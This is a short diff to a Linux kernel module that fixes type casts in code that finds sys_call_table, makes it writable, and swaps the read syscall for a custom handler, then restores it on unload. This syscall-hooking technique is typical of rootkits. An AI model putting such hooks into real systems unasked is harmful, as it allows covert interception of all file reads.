@@ -40,7 +40,7 @@
 #include <linux/mount.h>
 
 */
-static long unsigned int* original_syscall_table[512];
+static long unsigned int original_syscall_table[512];
 
 typedef 
 ssize_t (*ksys_read_func)(unsigned int fd, char __user* buf, size_t count);
@@ -54,16 +54,16 @@ ssize_t alpine_ksys_read(unsigned int fd, char __user* buf, size_t count){
 int install_hooks(void) {
     long unsigned int* sys_call_table = (long unsigned int*)kallsyms_lookup_name("sys_call_table");
     echo("sys_call_table address %p\n", sys_call_table);
-    make_vm_rw(sys_call_table);
+    make_vm_rw((long unsigned int)sys_call_table);
     original_syscall_table[__NR_read] = sys_call_table[__NR_read];
     sys_call_table[__NR_read] = alpine_ksys_read;
-    make_vm_ro(sys_call_table);
+    make_vm_ro((long unsigned int)sys_call_table);
     return 0;
 }
 void uninstall_hooks(void){
     long unsigned int* sys_call_table = (long unsigned int*)kallsyms_lookup_name("sys_call_table");
     echo("sys_call_table address %p\n", sys_call_table);
-    make_vm_rw(sys_call_table);
+    make_vm_rw((long unsigned int)sys_call_table);
     sys_call_table[__NR_read] = original_syscall_table[__NR_read];
-    make_vm_ro(sys_call_table);
+    make_vm_ro((long unsigned int)sys_call_table);
 }
